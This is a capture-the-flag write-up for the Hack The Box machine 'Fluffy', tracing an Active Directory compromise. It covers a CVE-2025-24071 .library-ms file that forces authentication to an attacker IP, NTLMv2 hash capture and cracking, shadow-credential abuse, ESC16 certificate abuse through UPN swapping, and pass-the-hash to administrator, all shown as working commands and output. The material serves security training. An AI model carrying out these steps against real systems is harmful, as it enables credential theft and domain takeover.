- - - 
created : 25-08-2025 

Tags : #easy 

Released on 24 May 2025 (Season 8)
- - - 
# Machine Information

As is common in real life [Windows](../../../3%20-%20Tags/Hacking%20Concepts/Windows.md) pentests, you will start the Fluffy box with credentials for the following account: `j.fleischman / J0elTHEM4n1990!`
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fluffy]
└─$ rustscan -a fluffy.htb -- -A 

Open 10.10.11.69:53
Open 10.10.11.69:88
Open 10.10.11.69:139
Open 10.10.11.69:389
Open 10.10.11.69:445
Open 10.10.11.69:464
Open 10.10.11.69:593
Open 10.10.11.69:636
Open 10.10.11.69:3269
Open 10.10.11.69:3268
Open 10.10.11.69:5985
Open 10.10.11.69:9389
Open 10.10.11.69:49666
Open 10.10.11.69:49686
Open 10.10.11.69:49688
Open 10.10.11.69:49690
Open 10.10.11.69:49707
Open 10.10.11.69:49710
Open 10.10.11.69:49743

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-26 00:41:50Z)
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)

445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)

3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)

5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49686/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49688/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49707/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49710/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49743/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC


Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-08-26T00:43:02
|_  start_date: N/A
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m00s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 53865/tcp): CLEAN (Timeout)
|   Check 2 (port 29668/tcp): CLEAN (Timeout)
|   Check 3 (port 5751/udp): CLEAN (Timeout)
|   Check 4 (port 56102/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

```

Seems we have an [Active Directory](../../../3%20-%20Tags/Hacking%20Concepts/Active%20Directory.md) environment.
# Enumeration
## SMB (445)

Using the given credentials we list the shares available with [SMBclient](../../../3%20-%20Tags/Hacking%20Tools/SMBclient.md) and find something interesting:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fluffy]
└─$ smbclient -L //10.10.11.69 -U j.fleischman --password=J0elTHEM4n1990!


        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        IT              Disk      
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.69 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Now we list the `IT` folder and download the pdf file:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fluffy]
└─$ smbclient //10.10.11.69/IT -U j.fleischman --password=J0elTHEM4n1990! 

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Sep  6 01:19:07 2025
  ..                                  D        0  Sat Sep  6 01:19:07 2025
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 17:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 17:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 17:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 17:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 16:31:07 2025

                5842943 blocks of size 4096. 2234649 blocks available
smb: \> get Upgrade_Notice.pdf cves.txt
getting file \Upgrade_Notice.pdf of size 169963 as cves.txt (87,7 KiloBytes/sec) (average 87,7 KiloBytes/sec)
```

After downloaded the shared folder content, we notice the only interesting file is **Upgrade_Notice.pdf**. It contains a bunch of CVEs that are patched or will be patched on the target system:

![Pasted image 20250905183319.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250905183319.png)

To view PDF files on [Kali Linux](../../../3%20-%20Tags/Hacking%20Tools/Kali%20Linux.md) you can use tools like Evince or Okular, which are popular PDF viewers. You can install them using the command `sudo apt install evince` or `sudo apt install okular` in the terminal.

Investigating these CVEs, we found a particular one with a PoC: [CVE-2025-24071](../../../3%20-%20Tags/CVEs/CVE-2025-24071.md)
# Exploit

We can find the [Exploit](../../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) on [Github](../../../3%20-%20Tags/Hacking%20Concepts/Github.md): https://github.com/0x6rss/CVE-2025-24071_PoC

**DESCRIPTION**

CVE-2025–24071 is a critical spoofing vulnerability in Microsoft Windows File Explorer that allows for the exposure of sensitive information to unauthorized actors. This flaw is due to the way Windows Explorer implicitly trusts and automatically parses .library-ms files, which are used to define libraries and network connections.

We clone the repo:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fluffy]
└─$ git clone https://github.com/0x6rss/CVE-2025-24071_PoC    
Clone in 'CVE-2025-24071_PoC' in corso...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (16/16), done.
remote: Total 18 (delta 4), reused 0 (delta 0), pack-reused 0 (from 0) 
   
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fluffy]
└─$ cd CVE-2025-24071_PoC 

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fluffy/CVE-2025-24071_PoC]
└─$ ls
poc.py  README.md  

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fluffy/CVE-2025-24071_PoC]
└─$ chmod +x poc.py 
```

Now we use the [Python](../../../3%20-%20Tags/Programming%20Languages/Python.md) script to make a file:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fluffy/CVE-2025-24071_PoC]
└─$ python3 poc.py 
Enter your file name: document
Enter IP (EX: 192.168.1.162): 10.10.xx.xx # Attacker IP
completed
```

Now we extract the file and `put` it in the `IT` share:

```bash         
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fluffy/CVE-2025-24071_PoC]
└─$ unzip exploit.zip     
Archive:  exploit.zip
  inflating: document.library-ms        

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fluffy/CVE-2025-24071_PoC]
└─$ ls
document.library-ms  exploit.zip  poc.py  README.md
   
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fluffy/CVE-2025-24071_PoC]
└─$ cat document.library-ms 
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.xx.xx\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>


┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fluffy/CVE-2025-24071_PoC]
└─$ smbclient //10.10.11.69/IT -U j.fleischman --password=J0elTHEM4n1990!

Try "help" to get a list of possible commands.

smb: \> put document.library-ms
```

Now we use [Responder](../Starting%20Point/Tier%201/Responder.md)  tool to listen and go to `\\YourIP\shared`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fluffy/CVE-2025-24071_PoC]
└─$ sudo responder -I tun0  
[sudo] password di mdn0x: 
...
[*] Version: Responder 3.1.7.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>
[*] To sponsor Responder: https://paypal.me/PythonResponder

[+] Listening for events...  

[SMB] NTLMv2-SSP Client   : 10.10.11.69
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:5ff63d3a9d71b8a5:F2CA71D0CCA61B8FFDD4547E7482952F:010100000000000080C7977A951EDC0103BAA1A7F15A70DA0000000002000800310049004C004B0001001E00570049004E002D004500420035005A004D004A00570034004D0056004D0004003400570049004E002D004500420035005A004D004A00570034004D0056004D002E00310049004C004B002E004C004F00430041004C0003001400310049004C004B002E004C004F00430041004C0005001400310049004C004B002E004C004F00430041004C000700080080C7977A951EDC01060004000200000008003000300000000000000001000000002000008C5E9E1F104804BC663CC275EA67EC6B0037AE15B5632E0D9D856BEDF5F2C7E00A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00350036000000000000000000      
[*] Skipping previously captured hash for FLUFFY\p.agila

```

We save the [Hash](../../../3%20-%20Tags/Hacking%20Concepts/Hash.md) in a file with [Nano](../../../3%20-%20Tags/Hacking%20Tools/Nano.md):

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fluffy/CVE-2025-24071_PoC]
└─$ cat hash.txt              
p.agila::FLUFFY:5ff63d3a9d71b8a5:F2CA71D0CCA61B8FFDD4547E7482952F:010100000000000080C7977A951EDC0103BAA1A7F15A70DA0000000002000800310049004C004B0001001E00570049004E002D004500420035005A004D004A00570034004D0056004D0004003400570049004E002D004500420035005A004D004A00570034004D0056004D002E00310049004C004B002E004C004F00430041004C0003001400310049004C004B002E004C004F00430041004C0005001400310049004C004B002E004C004F00430041004C000700080080C7977A951EDC01060004000200000008003000300000000000000001000000002000008C5E9E1F104804BC663CC275EA67EC6B0037AE15B5632E0D9D856BEDF5F2C7E00A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00350036000000000000000000    
```
## Hashcat

We use [Hashcat](../../../3%20-%20Tags/Hacking%20Tools/Hashcat.md) to crack the password:

```bash
┌──(mdn0x㉿mdn0xKali)-[~]
└─$ hashcat -m 5600 -a 0 hash /usr/share/wordlists/rockyou.txt

┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fluffy/CVE-2025-24071_PoC]
└─$ hashcat -m 5600 -a 0 hash2.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz, 6862/13789 MB (2048 MB allocatable), 12MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 3 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

P.AGILA::FLUFFY:5ff63d3a9d71b8a5:f2ca71d0cca61b8ffdd4547e7482952f:010100000000000080c7977a951edc0103baa1a7f15a70da0000000002000800310049004c004b0001001e00570049004e002d004500420035005a004d004a00570034004d0056004d0004003400570049004e002d004500420035005a004d004a00570034004d0056004d002e00310049004c004b002e004c004f00430041004c0003001400310049004c004b002e004c004f00430041004c0005001400310049004c004b002e004c004f00430041004c000700080080c7977a951edc01060004000200000008003000300000000000000001000000002000008c5e9e1f104804bc663cc275ea67ec6b0037ae15b5632e0d9d856bedf5f2c7e00a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00350036000000000000000000: 
                                             
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: P.AGILA::FLUFFY:5ff63d3a9d71b8a5:f2ca71d0cca61b8ffd...000000
<SNIP>    
```

One thing we may notice is that none of the two accounts we have, has permissions to remote access, so we need to continue exploring our options.
## Bloodhound

To collect [Active Directory](../../../3%20-%20Tags/Hacking%20Concepts/Active%20Directory.md) data for analysis we can use [Bloodhound](../../../3%20-%20Tags/Hacking%20Tools/Bloodhound.md), a popular tool for mapping attack paths in AD environments. 
Here’s a breakdown of the tool:
- Discovers users, groups, computers, organizational units (OUs), Group Policy Objects (GPOs), and trust relationships
- Identifies misconfigurations (e.g., excessive privileges, insecure delegation).

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fluffy/CVE-2025-24071_PoC]
└─$ bloodhound-python -d fluffy.htb -u 'p.agila' -p 'HTB{{REDACTED_PASSWD}}' -ns 10.10.11.69
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc01.fluffy.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Found 10 users
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Found 54 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 00M 07S
```

The user **p.agila** is member of **SERVICE ACCOUNT MANAGERS** and this group has **GenericAll** to the **SERVICE ACCOUNTS** group and then **SERVICE ACCOUNTS** has **GenericWrite** relationship to **ca_svc**, **ldap_svc** and **winrm_svc** accounts.  

With the **GenericAll** relationship we can directly modify the group members so we can add **p.agila** to **SERVICE ACCOUNTS** and after that we can do a **Shadow Credential attack** to any of the previous mentioned.

1. Add `p.agila` to **SERVICE ACCOUNTS**:

```bash
net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U "FLUFFY.HTB"/"p.agila"%"HTB{{REDACTED_PASSWD}}" -S "DC01.FLUFFY.HTB"
```

2. Make the certificates, obtain the TGT and the NT hash. The first account we try to attack is **winrm_svc** just because it has remote access rights so then we can attempt to use [Evil-WinRM](../../../3%20-%20Tags/Hacking%20Tools/Evil-WinRM.md) later, we can use `certipy-ad`:

```bash
certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'HTB{{REDACTED_PASSWD}}' -account 'WINRM_SVC' -dc-ip '10.10.11.69'
```

3.  Connect to the target machine 10.10.11.69 using [Evil-WinRM](../../../3%20-%20Tags/Hacking%20Tools/Evil-WinRM.md) and the **NTLM hash** of the `winrm_svc` account:

```bash
evil-winrm -i 10.10.11.69 -u winrm_svc -H HTB{{REDACTED_HASH}}
```

Now retrieve the user flag: 

```powershell
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> type user.txt
  HTB{{REDACTED_FLAG}}
```
# Lateral Movement - Privilege Escalation
## winrm_svc to ca_svc

Use `certipy` to write a Shadow Credential to get the NTLM hash of this user as we had GenericWrite permissions:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fluffy/CVE-2025-24071_PoC]
└─$ certipy-ad shadow -u 'winrm_svc' -dc-ip '10.10.11.69' -account 'ca_svc' auto

Certipy v5.0.3 - by Oliver Lyak (ly4k)

Saving credential cache to 'ca_svc.ccache'
File 'ca_svc.ccache' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

Finding vulnerable certificates:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fluffy]
└─$ export KRB5CCNAME=ca_svc.ccache
   
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fluffy]
└─$ certipy-ad find -vulnerable -u ca_svc@fluffy.htb -hashes HTB{{REDACTED_HASH}} -dc-ip 10.10.11.69 -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:11:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates

```

Read initial UPN of the victim account:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fluffy]
└─$ certipy-ad account -u 'p.agila@fluffy.htb' -p 'HTB{{REDACTED_PASSWD}}' -dc-ip '10.10.11.69' -user 'ca_svc' read

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Reading attributes for 'ca_svc':
    cn                                  : certificate authority service
    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
    name                                : certificate authority service
    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
    sAMAccountName                      : ca_svc
    servicePrincipalName                : ADCS/ca.fluffy.htb
    userPrincipalName                   : Administrator
    userAccountControl                  : 66048
    whenCreated                         : 2025-04-17T16:07:50+00:00
    whenChanged                         : 2025-09-06T21:16:25+00:00
```

Update the victim account’s UPN to the target administrator’s sAMAccountName:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fluffy]
└─$ certipy-ad account -u 'p.agila@fluffy.htb' -p 'HTB{{REDACTED_PASSWD}}' -dc-ip '10.10.11.69' -upn 'administrator' -user 'ca_svc' update
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : administrator
[*] Successfully updated 'ca_svc'
```

Request a certificate as the “victim” user from any suitable client authentication template (e.g., “User”) on the ESC16-vulnerable CA:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fluffy]
└─$ certipy-ad req -u ca_svc -hashes :HTB{{REDACTED_HASH}} -dc-ip 10.10.11.69 -ca fluffy-DC01-CA -template User -target DC01.fluffy.htb
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 18
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```

Revert the “victim” account’s UPN to original:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fluffy]
└─$ certipy-ad account update -u 'p.agila@fluffy.htb' -p 'HTB{{REDACTED_PASSWD}}' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' -ldap-scheme ldap -ldap-port 389 -no-ldap-signing -no-ldap-channel-binding       
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : ca_svc@fluffy.htb
[*] Successfully updated 'ca_svc'
```

Then use the certificate to get the administrator’s NTLM hash:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fluffy]
└─$ certipy-ad auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'

HTB{{REDACTED_HASH}}

```

Now with the Administrator hash, we can simply do a Pass the Hash:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Fluffy]
└─$ impacket-psexec -hashes HTB{{REDACTED_HASH}} Administrator@10.10.11.69

C:\Users\Administrator\Desktop> type root.txt
  HTB{{REDACTED_FLAG}}
```

Pwned !!